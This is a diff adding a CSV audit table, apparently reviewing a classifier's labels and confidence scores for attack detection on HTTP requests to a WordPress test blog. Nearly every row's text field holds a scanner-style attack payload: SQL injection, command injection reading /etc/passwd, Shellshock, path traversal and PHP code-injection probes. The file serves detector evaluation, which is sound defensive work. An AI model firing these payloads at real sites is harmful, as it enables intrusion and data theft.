@@ -1,0 +1,441 @@
+audit_id,pool_index,group,label,stage1_pred,stage1_msp,stage2_pred,judgment,reason,text
+0,99301,control,SQLInjection,SQLInjection,0.99782,SQLInjection,correct,,"/blog/index.php/my-account"" or 0 in (select sleep(15) ) -- 
+username=eagerToucan8&password=_l52MKnV&user-registration-login-nonce=6eac0e2d5f&_wp_http_referer=/blog/index.php/my-account/&login=Login&redirect=&rememberme=forever"
+1,98001,control,SQLInjection,SQLInjection,0.99999,SQLInjection,correct,,"/blog/index.php/2020/03/22/quidem-rerum-sit-doloribus-quia-eum"" or 0 in (select sleep(15) ) -- 
+"
+2,14495,control,SQLInjection,SQLInjection,1.0,SQLInjection,correct,,"/blog/index.php/2020 AND ROW(4868,6030)>(SELECT COUNT(*),CONCAT(0x3a727a613a,(SELECT (ELT(4868=4868,1))),0x3a6172743a,FLOOR(RAND(0)*2))x FROM (SELECT 1275 UNION SELECT 8952 UNION SELECT 6480 UNION SELECT 6726)a GROUP BY x)/03/22
+"
+3,113216,target,SQLInjection,Normal,0.99062,SQLInjection,wrong,cmd,"/blog|cat /etc/passwd#/wp-comments-post.php
+"
+4,98322,target,Normal,SQLInjection,0.99971,Normal,wrong,cmd,"/() { :;}; echo 'X-Powered-By: ShellShock-Vulnerable'/index.php/wp-json/oembed/1.0/embed?format=xml&url=http://test-site.com/blog/index.php/vitae-dolores-quidem-possimus-aut-voluptatibus/
+"
+5,92991,control,Normal,Normal,0.99971,Normal,wrong,rfi,"/blog/https://8501779237819759495.owasp.org/2020/04/04/inventore-asperiores-adipisci-cum-facere-voluptatem-rerum/embed
+"
+6,173573,control,Normal,Normal,0.99995,Normal,wrong,rfi,"/blog/wp-content/https:\\8501779237819759495.owasp.org/2020/04/65521cc1-512f-3af5-a40c-ad52a8de6f29-300x240.png
+"
+7,72548,target,Normal,SQLInjection,0.99826,Normal,wrong,cmd,"/blog/index.php/2020/04/04/ipsa-repellat-dignissimos-laudantium/() { :;}; /bin/sleep 15
+"
+8,187902,target,CodeInjection,SQLInjection,0.99479,CodeInjection,doubtful,probe,"/blog/wp-admin/load-styles.php?c=<!--&dir=ltr&load[]=dashicons,buttons,forms,l10n,login&ver=4.9.5
+"
+9,17332,control,SQLInjection,SQLInjection,1.0,SQLInjection,correct,,"/blog/index.php/2020/03/22/quidem-rerum-sit-doloribus-quia-eum/feed%') RLIKE (SELECT * FROM (SELECT(SLEEP(5)))UdEO) AND ('%'=
+"
+10,167484,target,Normal,SQLInjection,0.99262,Normal,wrong,sqli,"/blog/index.php/2020/03%') ORDER BY 1#/23/fuga-aut-recusandae-sed-dolor-quia/feed
+"
+11,120373,target,CodeInjection,SQLInjection,0.99009,CodeInjection,doubtful,probe,"/blog/index.php/my-account/edit-password/
+password_current=RDn_5C&password_1=RDn_5C&password_2=RDn_5C&_wpnonce=<!--&_wp_http_referer=/blog/index.php/my-account/edit-password/&save_change_password=Save changes&action=save_change_password"
+12,100316,control,SQLInjection,SQLInjection,0.99966,SQLInjection,correct,,"/blog/index.php/my-account/
+username=peacefulLion8&password=lnjtq&user-registration-login-nonce=6eac0e2d5f&_wp_http_referer=/blog/index.php/my-account/&login=Login&redirect=&rememberme=forever or 0 in (select sleep(15) ) -- "
+13,153256,control,Normal,Normal,0.99008,Normal,correct,,"/blog/wp-content/uploads/2020/04/ff237aac-eda3-37f9-8529-2cbfc90951b2.tmp.jpg
+"
+14,125418,control,Normal,Normal,0.99923,Normal,wrong,rfi,"/URL='http://8501779237819759495.owasp.org'/index.php/2020/04/04/nihil-tenetur-et-ad-in-dolores/embed
+"
+15,217207,target,SQLInjection,Normal,0.99731,SQLInjection,wrong,cmd,"/blog"";cat /etc/passwd;""/wp-login.php?action=lostpassword
+"
+16,17701,target,SQLInjection,CommandInjection,0.99028,SQLInjection,correct,,"/blog/index.php/my-account/edit-profile/
+profile-pic-url=&profile-default-image=http://1.gravatar.com/avatar/14d5b5665405f8accb4e5f2fa274cd44?s=96&d=mm&r=g&profile-pic=test_file.txt&user_registration_first_name=rafael / sleep(15) &user_registration_user_login=rafael&user_registration_last_name=gracia&user_registration_user_email=rafael@gmail.com&_wpnonce=5c88b58e23&_wp_http_referer=/blog/index.php/my-account/edit-profile/&save_account_details=Save changes&action=save_profile_details"
+17,126808,target,Normal,SQLInjection,0.99959,Normal,wrong,sqli,"/blog%' ORDER BY 1#/index.php/2020/03/27/qui-ratione-maxime-dolores-consequatur/feed
+"
+18,4772,target,SQLInjection,CommandInjection,0.99161,SQLInjection,correct,,"/blog/index.php/registration/
+first_name=ZAP&user_login=grudgingDunbird8&user_pass=ZAP&user_confirm_password=!Djb1Z32&last_name=ZAP&user_email=foo-bar@example.com&user_confirm_email=foo-bar@example.com&ur-user-form-id=97 OR 1=1&ur-redirect-url=&ur_frontend_form_nonce=371e07a3bf"
+19,104742,control,SQLInjection,SQLInjection,0.99899,SQLInjection,correct,,"/blog/wp-includes/js/jquery/ui/core.min.js?ver=1.11.4"" and 0 in (select sleep(15) ) -- 
+"
+20,51339,control,SQLInjection,SQLInjection,0.99999,SQLInjection,correct,,"/blog')) ORDER BY 1-- -/index.php/2020/03/29
+"
+21,143900,target,Normal,CommandInjection,0.99969,Normal,wrong,trav,"/blog/index.php/my-account/../../../../../../../../../../../../../../../../etc/passwd?mode=grid
+"
+22,170810,target,SQLInjection,Normal,0.99884,SQLInjection,correct,,"/blog/index.php||cat /etc/passwd/my-account/edit-profile/post.php?action=edit&post={{ data.id }}
+"
+23,137396,target,Normal,CommandInjection,0.99999,Normal,wrong,cmd,"/blog/index.php/my-account/edit-profile/../../../../../../../../../../../../../../../../?action=edit&post={{ data.id }}
+"
+24,108857,target,Normal,SQLInjection,0.9963,Normal,wrong,trav,"/blog/index.php/2020/03/27/qui-ratione-maxime-dolores-consequatur%' ORDER BY 1#
+"
+25,4456,target,Normal,CommandInjection,0.99591,Normal,wrong,sqli,"/blog/wp-content/themes/twentyseventeen/assets/() { :;}; /bin/sleep 15
+"
+26,143331,target,Normal,CommandInjection,0.99718,Normal,wrong,cmd,"/blog/index.php/tag/nihil-ut-deleniti-est/() { :;}; /bin/sleep 15
+"
+27,202843,target,SQLInjection,Normal,0.99595,SQLInjection,wrong,cmd,"/blog/wp-login.php`cat /etc/passwd`?action=lostpassword
+"
+28,166221,control,SQLInjection,SQLInjection,1.0,SQLInjection,wrong,cmd,"/blog') UNION ALL select NULL -- /wp-content/themes/twentyseventeen/assets/images
+"
+29,148851,target,SQLInjection,CommandInjection,0.99302,SQLInjection,correct,,"/blog/index.php/my-account/user-logout/?_wpnonce=14237a84a5
+username=yearningClam0&password=HO26Oi8&user-registration-login-nonce=6eac0e2d5f' OR '1'='1&_wp_http_referer=/blog/index.php/my-account/user-logout/?_wpnonce=14237a84a5&login=Login&redirect=&rememberme=forever"
+30,142887,control,SQLInjection,SQLInjection,1.0,SQLInjection,correct,,"/blog/index.php/2020/03')) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -/27/qui-ratione-maxime-dolores-consequatur/feed
+"
+31,211103,target,Normal,SQLInjection,0.99213,Normal,correct,,"/blog%') ORDER BY 1#/index.php/2020/03/27/qui-ratione-maxime-dolores-consequatur/embed
+"
+32,155244,control,SQLInjection,SQLInjection,1.0,SQLInjection,wrong,sqli,"/blog/index.php/tag/nihil-alias-ab/feed' AND '1'='1' -- 
+"
+33,168000,control,Normal,Normal,0.99989,Normal,correct,,"/blog/wp-content/uploads/2020""&cat /etc/passwd&""/04/e3780f73-5198-35c8-8ece-d2d4feda884e-1024x682.jpg
+"
+34,137654,target,SQLInjection,CommandInjection,0.99214,SQLInjection,wrong,sqli,"/blog/index.php/my-account/edit-profile/post.php/?action=edit&post={{ data.id }}
+username=puzzledHyena3&password=FjbH_Y&user-registration-login-nonce=6eac0e2d5f&_wp_http_referer=/blog/index.php/my-account/edit-profile/post.php/?action=edit&post={{ data.id }}&login=Login&redirect=&rememberme=forever"
+35,124303,target,SQLInjection,CommandInjection,0.99385,SQLInjection,wrong,cmd,"/blog/index.php/registration/
+first_name=ZAP&user_login=crushedBuzzard4&user_pass=ZAP&user_confirm_password=zmnC0N&last_name=ZAP OR 1=1&user_email=foo-bar@example.com&user_confirm_email=foo-bar@example.com&ur-user-form-id=97&ur-redirect-url=&ur_frontend_form_nonce=371e07a3bf"
+36,123366,control,SQLInjection,SQLInjection,1.0,SQLInjection,doubtful,noev,"/blog/index.php/2020) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -
+"
+37,51400,control,SQLInjection,SQLInjection,0.99998,SQLInjection,correct,,"/blog"") UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#/index.php/2020/03/22/quidem-rerum-sit-doloribus-quia-eum/feed
+"
+38,108189,target,Normal,CommandInjection,0.99923,Normal,correct,,"/blog/index.php/../../../../../../../../../../../../../../../../etc/passwd
+"
+39,113186,control,SQLInjection,SQLInjection,0.99996,SQLInjection,correct,,"/blog"") UNION ALL select NULL -- /wp-content/plugins/user-registration/assets/js
+"
+40,142489,control,SQLInjection,SQLInjection,1.0,SQLInjection,wrong,trav,"/blog' or 0 in (select sleep(15) ) -- /wp-admin/about.php
+"
+41,41308,control,Normal,Normal,0.99967,Normal,correct,,"/blog/wp-content/plugins&cat$jj $jj/etc$jj/passwd&/user-registration/assets/js/frontend
+"
+42,154382,control,SQLInjection,SQLInjection,0.99994,SQLInjection,correct,,"/blog/index.php/2020/03 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#/22/quidem-rerum-sit-doloribus-quia-eum/embed
+"
+43,174731,target,CommandInjection,CodeInjection,0.99545,CommandInjection,wrong,cmd,"/blog/wp-login.php
+log=${529942 998097}&pwd=*8WbYOPc&rememberme=forever&wp-submit=Log In&redirect_to=http://test-site.com/blog/wp-admin/&testcookie=1"
+44,19491,control,Normal,Normal,0.99997,Normal,doubtful,probe,"/blog/URL='http://8501779237819759495.owasp.org'/2020/04/04/animi-sint-ut-sed-commodi
+"
+45,205154,target,Normal,SQLInjection,0.99792,Normal,wrong,rfi,"/blog%' ORDER BY 1#/index.php/2020/03/29
+"
+46,29395,control,SQLInjection,SQLInjection,1.0,SQLInjection,wrong,sqli,"/blog/index.php/2020)) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -/03/27
+"
+47,45237,control,SQLInjection,SQLInjection,0.99985,SQLInjection,correct,,"/blog/index.php RLIKE (SELECT (CASE WHEN (6445=1038) THEN 0x696e6465782e706870 ELSE 0x28 END))-- lErQ/2020/03/27
+"
+48,38842,target,SQLInjection,Normal,0.99845,SQLInjection,correct,,"/blog"";cat /etc/passwd;""/index.php/my-account/edit-profile
+"
+49,54672,target,SQLInjection,CommandInjection,0.99412,SQLInjection,wrong,cmd,"/blog/index.php/porro-corrupti-cupiditate-neque-fugit-aperiam-exercitationem/() { :;}; echo 'X-Powered-By: ShellShock-Vulnerable'
+"
+50,224336,target,Normal,SQLInjection,0.99976,Normal,wrong,cmd,"/blog/|/my-account/edit-password
+password_current=$E&-$w&password_1=$E&-$w&password_2=$E&-$w&_wpnonce=b9dad6a8b5&_wp_http_referer=/blog/index.php/my-account/edit-password/&save_change_password=Save changes&action=save_change_password"
+51,71562,target,SQLInjection,Normal,0.99903,SQLInjection,doubtful,probe,"/blog/index.php`cat /etc/passwd`/my-account
+"
+52,37359,control,CodeInjection,CodeInjection,1.0,CodeInjection,wrong,cmd,"/${@print(chr(122).chr(97).chr(112).chr(95).chr(116).chr(111).chr(107).chr(101).chr(110))}\/index.php/sample-page/nulla-quisquam-est-ut-nemo
+"
+53,214432,target,Normal,SQLInjection,0.99732,Normal,correct,,"/blog/index.php/2020/03/27/qui-ratione-maxime-dolores-consequatur%' ORDER BY 1#/feed
+"
+54,171704,control,Normal,Normal,0.99161,Normal,wrong,sqli,"/blog/wp-includes/js/jquery/jquery.js?ver=5;URL='http://8501779237819759495.owasp.org'
+"
+55,83931,control,SQLInjection,SQLInjection,0.99842,SQLInjection,wrong,rfi,"/blog/index.php/registration/
+first_name=ZAP&user_login=importedSnail4&user_pass=ZAP&user_confirm_password=bqeqL7M&last_name=ZAP AND 1=1 -- &user_email=foo-bar@example.com&user_confirm_email=foo-bar@example.com&ur-user-form-id=97&ur-redirect-url=&ur_frontend_form_nonce=371e07a3bf"
+56,154466,control,SQLInjection,SQLInjection,1.0,SQLInjection,correct,,"/blog/index.php/2020/03/23/(SELECT 5333 FROM(SELECT COUNT(*),CONCAT(0x3a727a613a,(SELECT (ELT(5333=5333,1))),0x3a6172743a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a
+"
+57,91020,control,SQLInjection,SQLInjection,0.99981,SQLInjection,correct,,"/blog/index.php/2020/03/23/fuga-aut-recusandae-sed-dolor-quia')) UNION ALL SELECT NULL,NULL-- -/feed
+"
+58,171940,control,SQLInjection,SQLInjection,1.0,SQLInjection,correct,,"/blog ASC  -- /index.php/2020/03/22/quidem-rerum-sit-doloribus-quia-eum
+"
+59,127002,target,Normal,SQLInjection,0.99799,Normal,correct,,"/blog%' ORDER BY 1#/index.php/2020/03/22
+"
+60,10010,control,SQLInjection,SQLInjection,1.0,SQLInjection,correct,,"/blog"" RLIKE (SELECT (CASE WHEN (3162=3162) THEN 0x626c6f67 ELSE 0x28 END)) AND ""hUld""=""hUld/index.php/2020
+"
+61,180021,control,SQLInjection,SQLInjection,1.0,SQLInjection,wrong,sqli,"/blog)) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -/index.php/2020/03
+"
+62,11343,target,SQLInjection,Normal,0.99463,SQLInjection,correct,,"/blog/index.php|cat /etc/passwd#/my-account/edit-profile/post.php?action=edit&post={{ data.id }}
+"
+63,41305,target,SQLInjection,Normal,0.99237,SQLInjection,correct,,"/blog`cat /etc/passwd`/wp-login.php
+"
+64,88328,target,Normal,SQLInjection,0.99892,Normal,wrong,cmd,"/blog%' ORDER BY 1#/index.php/2020/03
+"
+65,62566,control,SQLInjection,SQLInjection,1.0,SQLInjection,wrong,cmd,"/blog/index.php/2020/03/29/distinctio-sequi-officiis-occaecati"" OR ""1""=""1"" -- /feed
+"
+66,181780,control,SQLInjection,SQLInjection,0.99998,SQLInjection,wrong,sqli,"/blog/index.php');(SELECT * FROM (SELECT(SLEEP(5)))jJfw)#
+"
+67,21370,control,SQLInjection,SQLInjection,0.99997,SQLInjection,correct,,"/blog/index.php/author"") UNION ALL select NULL -- /vtromp/feed
+"
+68,82366,control,Normal,Normal,0.99669,Normal,wrong,rfi,"/blog/index.php/8501779237819759495.owasp.org/sipes-nolan/feed
+"
+69,106707,control,SQLInjection,SQLInjection,1.0,SQLInjection,correct,,"/blog/index.php/2020/04/04/tempore-odit-cupiditate-voluptas-laudantium-et-facilis"" OR ""1""=""1"" -- /embed
+"
+70,148377,target,Normal,SQLInjection,0.99249,Normal,wrong,sqli,"/blog%' ORDER BY 1#
+"
+71,7089,target,CodeInjection,SQLInjection,0.99212,CodeInjection,doubtful,probe,"/blog/wp-login.php
+log=lazyKitten5&pwd=oaINB&rememberme=<!--&wp-submit=Log In&redirect_to=http://test-site.com/blog/wp-admin/&testcookie=1"
+72,124183,target,SQLInjection,Normal,0.9989,SQLInjection,wrong,cmd,"/blog/index.php/my-account|cat /etc/passwd#/edit-profile?mode=grid
+"
+73,37160,target,SQLInjection,CommandInjection,0.99069,SQLInjection,correct,,"/blog/index.php/my-account/user-logout/
+username=soreKitten5 AND 1=1&password=$3M*qUe&user-registration-login-nonce=6eac0e2d5f&_wp_http_referer=/blog/index.php/my-account/user-logout/&login=Login&redirect=&rememberme=forever"
+74,144934,target,Normal,SQLInjection,0.99796,Normal,wrong,sqli,"/blog%' ORDER BY 1#/index.php/2020/03/23
+"
+75,178823,target,SQLInjection,CommandInjection,0.99231,SQLInjection,doubtful,noev,"/blog/wp-login.php
+log=innocentOryx8&pwd=1Mcj!$&rememberme=forever&wp-submit=Log In&redirect_to=http://test-site.com/blog/wp-admin/profile.php&testcookie=1"
+76,209363,control,SQLInjection,SQLInjection,1.0,SQLInjection,correct,,"/blog/index.php/2020"" and 0 in (select sleep(15) ) -- /03/22/quidem-rerum-sit-doloribus-quia-eum
+"
+77,157675,control,SQLInjection,SQLInjection,1.0,SQLInjection,correct,,"/blog/index.php/2020%' AND EXTRACTVALUE(1713,CONCAT(0x5c,0x3a727a613a,(SELECT (ELT(1713=1713,1))),0x3a6172743a)) AND '%'='/03/27
+"
+78,85385,target,SQLInjection,Normal,0.9927,SQLInjection,wrong,cmd,"/blog|cat /etc/passwd#/index.php/registration
+"
+79,110177,target,SQLInjection,CommandInjection,0.9936,SQLInjection,correct,,"/blog/index.php/my-account/user-logout/?_wpnonce=14237a84a5
+username=innocentEggs5&password=k8ktg&user-registration-login-nonce=6eac0e2d5f&_wp_http_referer=/blog/index.php/my-account/user-logout/?_wpnonce=14237a84a5&login=Login OR 1=1&redirect=&rememberme=forever"
+80,181283,target,SQLInjection,Normal,0.9908,SQLInjection,wrong,cmd,"/blog/index.php/my-account||cat /etc/passwd/edit-profile?mode=grid
+"
+81,149092,target,SQLInjection,Normal,0.99889,SQLInjection,doubtful,noev,"/?s=&zap=zaproxy
+"
+82,158435,control,SQLInjection,SQLInjection,0.99985,SQLInjection,correct,,"/blog/wp-content/uploads/2020"") UNION ALL select NULL -- /04/4eb284d3-cf2e-320a-949c-44cf6c5433a9.jpg
+"
+83,87733,control,CodeInjection,CodeInjection,0.99989,CodeInjection,correct,,"/blog/index.php/2020/03/27/${@print(chr(122).chr(97).chr(112).chr(95).chr(116).chr(111).chr(107).chr(101).chr(110))}
+"
+84,193884,control,SQLInjection,SQLInjection,1.0,SQLInjection,correct,,"/blog"" OR ""1""=""1"" -- /wp-includes/js/jquery/ui/core.min.js?ver=1.11.4
+"
+85,70625,control,SQLInjection,SQLInjection,1.0,SQLInjection,correct,,"/blog) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL#/index.php/2020
+"
+86,72212,target,SQLInjection,Normal,0.99858,SQLInjection,wrong,cmd,"/blog||cat /etc/passwd/index.php/my-account/edit-password
+"
+87,34886,control,Normal,Normal,0.99973,Normal,wrong,rfi,"/blog/URL='http://8501779237819759495.owasp.org'/js/plupload/moxie.min.js?ver=1.3.5
+"
+88,27178,target,SQLInjection,Normal,0.99554,SQLInjection,wrong,cmd,"/blog"";cat /etc/passwd;""/wp-login.php?action=register
+"
+89,93456,target,SQLInjection,Normal,0.9905,SQLInjection,wrong,cmd,"/blog`cat /etc/passwd`/index.php/my-account
+"
+90,219322,control,SQLInjection,SQLInjection,1.0,SQLInjection,correct,,"/blog/index.php OR 1=1 -- /2020/04/04/animi-sint-ut-sed-commodi/feed
+"
+91,156738,target,Normal,CommandInjection,0.99224,Normal,wrong,trav,"/blog/index.php/my-account//../../../../../../../../../../../../../../../../etc/passwd/post.php?action=edit&post={{ data.id }}
+"
+92,107639,target,SQLInjection,Normal,0.99608,SQLInjection,wrong,cmd,"/blog&&cat /etc/passwd/wp-comments-post.php
+"
+93,28973,control,SQLInjection,SQLInjection,0.99999,SQLInjection,correct,,"/blog/index.php/2020/03/23/fuga-aut-recusandae-sed-dolor-quia/feed"" AND ""1""=""2"" -- 
+"
+94,22028,control,CodeInjection,CodeInjection,0.99999,CodeInjection,correct,,"/blog/wp-content/uploads/2020/${@print(chr(122).chr(97).chr(112).chr(95).chr(116).chr(111).chr(107).chr(101).chr(110))}\/1faecdf0-334c-3262-b83f-a897be68c7e2.png
+"
+95,1667,control,SQLInjection,SQLInjection,1.0,SQLInjection,correct,,"/blog/index.php')) UNION ALL SELECT NULL,NULL,NULL-- -/2020/03/23/fuga-aut-recusandae-sed-dolor-quia/feed
+"
+96,29118,target,SQLInjection,Normal,0.99845,SQLInjection,wrong,cmd,"/blog/index.php/my-account;cat /etc/passwd;/edit-profile?mode=grid
+"
+97,188157,control,Normal,Normal,0.99864,Normal,wrong,rfi,"/blog/HtTpS://8501779237819759495.owasp.org/sample-page/feed
+"
+98,98983,control,SQLInjection,SQLInjection,1.0,SQLInjection,correct,,"/blog/index.php/category/uncategorized/feed) UNION ALL select NULL -- 
+"
+99,96095,target,Normal,SQLInjection,0.99347,Normal,wrong,sqli,"/blog%' ORDER BY 1#/index.php/2020/03/22/quidem-rerum-sit-doloribus-quia-eum/feed
+"
+100,50586,target,SQLInjection,Normal,0.99662,SQLInjection,wrong,cmd,"/blog/index.php||cat /etc/passwd/my-account/edit-profile?mode=grid
+"
+101,151456,control,Normal,Normal,0.99122,Normal,doubtful,probe,"/blog/wp-content/uploads/2022-2/04/48cf902e-a565-3e60-8512-c19e2e6a72db.jpg
+"
+102,172577,target,Normal,SQLInjection,0.99986,Normal,wrong,trav,"..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/etc\/passwd
+"
+103,186385,target,SQLInjection,CommandInjection,0.99065,SQLInjection,doubtful,noev,"/blog/index.php/my-account/edit-profile/post.php/?action=edit&post={{ data.id }}
+username=mereSmelt7&password=1tA#5J&user-registration-login-nonce=6eac0e2d5f&_wp_http_referer=/blog/index.php/my-account/edit-profile/post.php/?action=edit&post={{ data.id }}&login=Login&redirect=&rememberme=forever"
+104,204605,control,SQLInjection,SQLInjection,0.99999,SQLInjection,correct,,"/blog/index.php/2020/03%') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#/27
+"
+105,206339,target,Normal,CommandInjection,1.0,Normal,wrong,trav,"/blog/index.php/my-account/edit-profile//../../../../../../../../../../../../../../../../?action=edit&post={{ data.id }}
+"
+106,83005,control,SQLInjection,SQLInjection,1.0,SQLInjection,correct,,"/blog/index.php/2020/03') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#/23
+"
+107,181825,control,SQLInjection,SQLInjection,1.0,SQLInjection,correct,,"/blog/index.php/2020' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#/03/23
+"
+108,147564,target,Normal,SQLInjection,0.99047,Normal,doubtful,probe,"/blog/wp-content%/uploads/2020/04/02020950-6e37-3272-9dbf-3093969e3563.jpg
+"
+109,102377,target,Normal,SQLInjection,0.99341,Normal,wrong,sqli,"/blog/index.php/2020/03/23/fuga-aut-recusandae-sed-dolor-quia/embed%') ORDER BY 1#
+"
+110,75848,target,SQLInjection,Normal,0.99636,SQLInjection,wrong,cmd,"/blog/index.php/my-account|cat /etc/passwd#/user-logout?_wpnonce=14237a84a5
+"
+111,12128,target,Normal,CommandInjection,0.99496,Normal,wrong,cmd,"/blog/wp-content/() { :;}; /bin/sleep 15
+"
+112,119062,control,Normal,Normal,0.9915,Normal,wrong,cmd,"/blog/wp-content/uploads/2020'&cat /etc/passwd&'/04/f51dfb19-3fe8-380e-91a6-3912fdae661e-300x200.jpg
+"
+113,28093,target,Normal,SQLInjection,0.99737,Normal,wrong,sqli,"/blog/index.php%' ORDER BY 1#/2020/03/23/fuga-aut-recusandae-sed-dolor-quia/feed
+"
+114,123644,control,SQLInjection,SQLInjection,1.0,SQLInjection,correct,,"/blog/index.php/2020/03 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL-- -/27/qui-ratione-maxime-dolores-consequatur/embed
+"
+115,208453,control,CodeInjection,CodeInjection,0.99999,CodeInjection,correct,,"/';print(chr(122).chr(97).chr(112).chr(95).chr(116).chr(111).chr(107).chr(101).chr(110));$var='/index.php/page
+"
+116,100833,control,SQLInjection,SQLInjection,0.99979,SQLInjection,wrong,cmd,"/blog||cat /etc/passwd/index.php/my-account/edit-profile/{{ data.size.url }}
+"
+117,224633,target,Normal,SQLInjection,0.99761,Normal,wrong,sqli,"/blog/index.php/2020%') ORDER BY 1#/03/23/fuga-aut-recusandae-sed-dolor-quia/embed
+"
+118,174932,target,Normal,CommandInjection,1.0,Normal,wrong,trav,"/blog/index.php/my-account//../../../../../../../../../../../../../../../../etc/passwd
+"
+119,201717,control,SQLInjection,SQLInjection,0.99818,SQLInjection,correct,,"/blog' where 0 in (select sleep(15) ) -- /wp-content/uploads/2020/04/27f17687-adda-3ce6-9767-0037ea74eec2-300x240.png
+"
+120,185830,control,Normal,Normal,0.99349,Normal,correct,,"/blog/index.php/2020/03/22/0W45pz4p/feed/
+"
+121,213315,target,SQLInjection,Normal,0.99145,SQLInjection,doubtful,probe,"/blog/wp-content/uploads/NULL/04/02020950-6e37-3272-9dbf-3093969e3563.jpg
+"
+122,156182,target,SQLInjection,Normal,0.99176,SQLInjection,wrong,cmd,"/blog||cat /etc/passwd/wp-login.php?action=register
+"
+123,110685,target,SQLInjection,Normal,0.99352,SQLInjection,wrong,cmd,"/blog/wp-login.php|cat /etc/passwd#?action=register
+"
+124,174816,control,SQLInjection,SQLInjection,0.99997,SQLInjection,correct,,"/blog/index.php/commodi-ut-sint-sequi-excepturi%'  -- 
+"
+125,76561,target,SQLInjection,CommandInjection,0.99564,SQLInjection,correct,,"/blog/index.php/my-account/user-logout/?_wpnonce=14237a84a5
+username=pleasedCurlew1&password=aIu2N&U0&user-registration-login-nonce=6eac0e2d5f&_wp_http_referer=/blog/index.php/my-account/user-logout/?_wpnonce=14237a84a5&login=Login OR 1=1&redirect=&rememberme=forever"
+126,212528,control,Normal,Normal,0.99864,Normal,wrong,cmd,"/blog&cat$jj $jj/etc$jj/passwd&/index.php/category/uncategorized/page
+"
+127,177511,control,SQLInjection,SQLInjection,1.0,SQLInjection,correct,,"/blog/index.php/2020' and 0 in (select sleep(15) ) -- /04/04/consequatur-ad-error-quidem/embed
+"
+128,162123,control,SQLInjection,SQLInjection,1.0,SQLInjection,correct,,"/blog/index.php/2020/03/22' RLIKE (SELECT (CASE WHEN (9793=2331) THEN 22 ELSE 0x28 END)) AND 'lShn'='lShn/quidem-rerum-sit-doloribus-quia-eum/feed
+"
+129,66982,target,SQLInjection,Normal,0.99625,SQLInjection,wrong,cmd,"/blog/index.php||cat /etc/passwd/my-account/edit-password
+"
+130,106214,control,CodeInjection,CodeInjection,0.99999,CodeInjection,correct,,"/blog/${@print(chr(122).chr(97).chr(112).chr(95).chr(116).chr(111).chr(107).chr(101).chr(110))}\/js/imgareaselect/imgareaselect.css?ver=0.9.8
+"
+131,175847,control,SQLInjection,SQLInjection,1.0,SQLInjection,correct,,"/blog/index.php/2020/03/29' or 0 in (select sleep(15) ) -- 
+"
+132,213535,target,Normal,SQLInjection,0.99619,Normal,doubtful,probe,"/blog/wp-content%/uploads/2020/04/bdffa507-6fa1-380b-b720-116dfaf00c82.jpg
+"
+133,189664,control,SQLInjection,SQLInjection,1.0,SQLInjection,correct,,"/blog/index.php OR 1=1 -- /tag/hic-enim-consequatur-minima-quibusdam-magnam
+"
+134,145582,control,Normal,Normal,0.99785,Normal,wrong,cmd,"/blog'&cat /etc/passwd&'/wp-content/plugins/user-registration/assets/js/inputmask
+"
+135,101867,control,SQLInjection,SQLInjection,1.0,SQLInjection,correct,,"/blog/wp-content/uploads/2020 ASC  -- /04/02020950-6e37-3272-9dbf-3093969e3563-300x200.jpg
+"
+136,112658,control,SQLInjection,SQLInjection,0.99998,SQLInjection,wrong,cmd,"/blog/index.php/tag/nobis-perspiciatis-optio"" where 0 in (select sleep(15) ) -- 
+"
+137,101722,target,SQLInjection,Normal,0.99155,SQLInjection,wrong,trav,"/blog/index.php/my-account||cat /etc/passwd/user-logout?_wpnonce=14237a84a5
+"
+138,207233,target,Normal,CommandInjection,0.99833,Normal,wrong,cmd,"/../../../../../../../../../../etc/passwd
+"
+139,91361,target,Normal,SQLInjection,0.99955,Normal,doubtful,noev,"/blog/() { :;}; echo 'X-Powered-By: ShellShock-Vulnerable'/wp-json/oembed/1.0/embed?url=http://test-site.com/blog/index.php/vitae-dolores-quidem-possimus-aut-voluptatibus/
+"
+140,147992,control,SQLInjection,SQLInjection,1.0,SQLInjection,doubtful,noev,"/\{{ data.link }}/index.php/my-account/edit-profile/{{ data.link }}
+"
+141,217057,target,SQLInjection,CommandInjection,0.99082,SQLInjection,wrong,cmd,"/blog/index.php/my-account/edit-profile/post.php/?action=edit&post={{ data.id }}
+username=gutturalDunbird4&password=p14MD8r&user-registration-login-nonce=6eac0e2d5f&_wp_http_referer=/blog/index.php/my-account/edit-profile/post.php/?action=edit&post={{ data.id }}&login=Login&redirect=&rememberme=forever"
+142,163093,target,SQLInjection,Normal,0.99358,SQLInjection,correct,,"/blog';cat /etc/passwd;'/index.php/my-account/edit-profile?mode=grid
+"
+143,54183,control,SQLInjection,SQLInjection,0.99996,SQLInjection,correct,,"/blog/index.php/2020/04"") UNION ALL select NULL -- /04
+"
+144,176523,control,SQLInjection,SQLInjection,0.9998,SQLInjection,correct,,"/blog/index.php/my-account/edit-profile/{{ data.model.url }}') UNION ALL select NULL -- 
+"
+145,15416,control,CodeInjection,CodeInjection,0.99999,CodeInjection,correct,,"/blog/wp-includes/;print(chr(122).chr(97).chr(112).chr(95).chr(116).chr(111).chr(107).chr(101).chr(110));/dashicons.min.css?ver=4.9.5
+"
